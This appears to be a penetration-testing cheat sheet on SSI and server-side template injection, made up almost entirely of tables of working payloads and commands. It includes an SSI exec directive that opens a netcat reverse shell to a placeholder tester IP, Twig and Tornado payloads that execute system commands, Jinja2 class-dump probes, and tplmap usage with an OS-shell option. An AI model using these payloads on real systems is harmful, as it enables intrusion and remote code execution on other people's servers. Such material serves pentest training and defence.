____

## SSI Injection Exploitation Example

|**SSI Directive Payload**|**Description**|
|---|---|
|`<!--#echo var="DATE_LOCAL" -->`|Date|
|`<!--#printenv -->`|All variables|
|`<!--#exec cmd="mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo\|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->`|Reverse Shell|

## SSTI Exploitation Example 1

|**Command**|**Description**|
|---|---|
|`git clone https://github.com/epinna/tplmap.git`|Cloning the tplmap repoistory|
|`cd tplmap`|Navigating to the new directory|
|`pip install virtualenv`|Installing the virtual environment with pip|
|`virtualenv -p python2 venv`|Creating a virtual environment named venv with python2|
|`source venv/bin/activate`|Activating a Python virtual environment, configuring the shell to use the virtual environment's Python interpreter|
|`pip install -r requirements.txt`|Installing dependencies|
|`./tplmap.py -u 'http://<TARGET IP>:<PORT>' -d name=john`|Running tplmap against the target|
|`./tplmap.py -u 'http://<TARGET IP>:<PORT>' -d name=john --os-shell`|Running tplmap with the os-shell option|
|`{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}`|Twig RCE payload|

## SSTI Exploitation Example 2

|**Command**|**Description**|
|---|---|
|`curl -X POST -d 'email=${7*7}' http://<TARGET IP>:<PORT>/jointheteam`|Interacting with the remote target (Spring payload)|
|`curl -X POST -d 'email={{_self.env.display("TEST"}}' http://<TARGET IP>:<PORT>/jointheteam`|Interacting with the remote target (Twig payload)|
|`curl -X POST -d 'email={{config.items()}}' http://<TARGET IP>:<PORT>/jointheteam`|Interacting with the remote target (Jinja2 basic injection)|
|`curl -X POST -d 'email={{ [].class.base.subclasses() }}' http://<TARGET IP>:<PORT>/jointheteam`|Interacting with the remote target (Jinja2 dump all classes payload)|
|`curl -X POST -d "email={% import os %}{{os.system('whoami')}}" http://<TARGET IP>:<PORT>/jointheteam`|Interacting with the remote target (Tornado payload)|
|`./tplmap.py -u 'http://<TARGET IP>:<PORT>/jointheteam' -d email=blah`|Automating the exploitation process with tplmap|

## SSTI Exploitation Example 3

|**Command**|**Description**|
|---|---|
|`curl -gs "http://<TARGET IP>:<PORT>/execute?cmd={{7*'7'}}"`|Interacting with the remote target (Confirming Jinja2 backend)|
|`./tplmap.py -u 'http://<TARGET IP>:<PORT>/execute?cmd'`|Automating the templating engine identification process with tplmap|
|`python3`|Starting the python3 interpreter|

|**Methods**|**Description**|
|---|---|
|`__class__`|Returns the object (class) to which the type belongs|
|`__mro__`|Returns a tuple containing the base class inherited by the object. Methods are parsed in the order of tuples.|
|`__subclasses__`|Each new class retains references to subclasses, and this method returns a list of references that are still available in the class|
|`__builtins__`|Returns the builtin methods included in a function|
|`__globals__`|A reference to a dictionary that contains global variables for a function|
|`__base__`|Returns the base class inherited by the object|
|`__init__`|Class initialization method|
